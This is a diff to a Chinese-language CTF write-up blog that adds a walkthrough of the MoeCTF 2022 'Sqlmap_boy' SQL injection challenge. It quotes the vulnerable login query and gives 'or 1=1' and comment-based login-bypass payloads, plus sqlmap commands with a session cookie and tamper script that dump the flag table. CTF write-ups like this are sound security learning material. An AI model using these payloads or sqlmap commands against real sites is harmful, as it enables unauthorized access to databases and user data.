@@ -566,17 +566,112 @@ name=admi' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
 
 **NSSCTF{8c9f1139-03bf-4421-af17-c2b48003c861}**
 
----
+
+
+# #9.[MoeCTF 2022]Sqlmap_boy
+
+![image-20260111183031709](/images/image-20260111183031709.png)
+
+一个简单的登入页面，ctrl+ u，看一下。
+
+![image-20260111173629883](/images/image-20260111173629883.png)
+
+`<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->`
+
+```
+	function login(){
+		var username = $("#username").val();
+		var password = $("#password").val();
+		$.ajax({
+			type:"POST",
+			url:"login.php",
+			data:{
+				username:username,
+				password:password
+			},
+			success:function(data){
+				//json decode
+				var data = JSON.parse(data);
+				var code = data.code;
+				var message = data.message;
+				if(code == '0'){
+					alert(message);
+				}else{
+					var redirect = data.redirect;
+					window.location.href = redirect;
+				}
+			}
+		});
+	}
+```
+
+发现了两个比较重要的点，本来还以为是直接在username和password之中注入呢。
+
+简单抓一下包。
+
+![image-20260111174220068](/images/image-20260111174220068.png)
+
+username=admin'+or+'1'%3D'1&password=1+'+or+'1'%3D1'
+
+admin' or '1'='1	1 ' or '1'=1'
+
+空格=+，等号=%3D
+
+ok。
+
+根据`<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->`
+
+直接在username注入admin.'" or 1 = 1#，将后面的注释掉，登入页面，发现：
+
+![image-20260111183634450](/images/image-20260111183634450.png)
+
+这里倒有一个注入点，id=1。
+
+sqlmap走起。
+
+直接注入当然是不行的，毕竟secrets.php这个页面也是我们使用万能密码才能进来的，去看一下cookie，在sqlmap的指令中带一下。
+
+就可以了。
+
+`sqlmap -u http://node5.anna.nssctf.cn:22191/secrets.php?id=1 --cookie=PHPSESSID=7d372a7af6f7a04161d77bd398fc6969 --batch`
+
+![image-20260111183909008](/images/image-20260111183909008.png)
+
+存在联合，布尔，时间注入。
+
+一顿爆注。
+
+最终拿下flag。
+
+`sqlmap -u "http://node5.anna.nssctf.cn:28690/secrets.php?id=1" --cookie="PHPSESSID=7d372a7af6f7a04161d77bd398fc6969" --tamper=space2comment -D "moectf" -T "flag" -C "flAg" --dump --batch`
+
+![image-20260111182453601](/images/image-20260111182453601.png)
+
+也不知道，wsl出问题就算了，最后要交flag，结果服务器断了，然后没注意就一直交之前的flag，过不去。
+
+**NSSCTF{e5ba72ce-2ddf-4115-b741-7d00b2a01b0c}**
+
+
 
 ---
 
----
 
----
 
----
+# #10.
 
----
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ---
 
